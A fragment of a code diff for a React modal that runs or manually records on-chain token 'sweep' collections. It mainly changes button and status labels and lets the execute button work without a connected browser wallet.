                   className="w-full border border-gray-300 rounded-lg px-3 py-2 text-xs font-mono bg-white focus:outline-none focus:ring-2 focus:ring-teal-500"
                 />
               </div>
@@ -817,7 +841,7 @@ export function LiveSweepModal({
               <div className="bg-rose-50 border border-rose-200 rounded-xl p-3 text-xs text-rose-700 font-medium">
                 <div className="font-bold flex items-center gap-1.5 mb-1">
                   <AlertTriangle className="w-4 h-4 text-rose-600" />
-                  Transaction Failed
+                  Sweep Failed
                 </div>
                 <p className="break-all font-mono text-[11px]">{executionError}</p>
               </div>
@@ -827,7 +851,7 @@ export function LiveSweepModal({
               <div className="bg-emerald-50 border border-emerald-200 rounded-xl p-3.5 space-y-2">
                 <div className="flex items-center gap-2 text-emerald-800 font-bold text-xs">
                   <CheckCircle2 className="w-4 h-4 text-emerald-600" />
-                  ⚡ Sweep Transaction Broadcast Live On-Chain!
+                  ⚡ Sweep Transaction Confirmed Live On-Chain!
                 </div>
                 <div className="flex items-center justify-between bg-white border border-emerald-200 rounded-lg p-2 font-mono text-xs">
                   <span className="truncate max-w-[340px] text-gray-800 font-bold">{executionTxHash}</span>
@@ -860,7 +884,7 @@ export function LiveSweepModal({
           /* Manual Tab */
           <div className="p-6 space-y-4 max-h-[75vh] overflow-y-auto">
             <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 text-xs text-blue-900 leading-relaxed">
-              Use this tab to manually record collections that were executed via external multisig wallets or the backend CLI script (<code>scripts/execute-sweep.mjs</code>).
+              Use this tab to manually record collections that were executed via external multisig wallets or the backend CLI script.
             </div>
 
             <div className="grid grid-cols-2 gap-4">
@@ -988,7 +1012,7 @@ export function LiveSweepModal({
             {activeTab === 'live' ? (
               <span className="flex items-center gap-1 text-teal-700 font-medium">
                 <ShieldCheck className="w-3.5 h-3.5" />
-                Live on-chain call: <code className="font-mono font-bold">transferFrom</code>
+                {executionMethod === 'server' ? 'Direct 1-Click Server Collection' : 'Browser Web3 Collection'}
               </span>
             ) : (
               'Manual entry will be saved directly to Firestore'
@@ -1006,13 +1030,13 @@ export function LiveSweepModal({
             {activeTab === 'live' ? (
               <button
                 onClick={handleExecuteLiveSweep}
-                disabled={isExecuting || !connectedWallet}
+                disabled={isExecuting}
                 className="inline-flex items-center gap-1.5 px-5 py-2 text-xs font-bold rounded-xl bg-teal-600 hover:bg-teal-500 disabled:opacity-50 text-white shadow-md transition-all hover:shadow-teal-500/20"
               >
                 {isExecuting ? (
                   <>
                     <RotateCw className="w-3.5 h-3.5 animate-spin" />
-                    Executing On-Chain...
+                    Executing Sweep...
                   </>
                 ) : (
                   <>
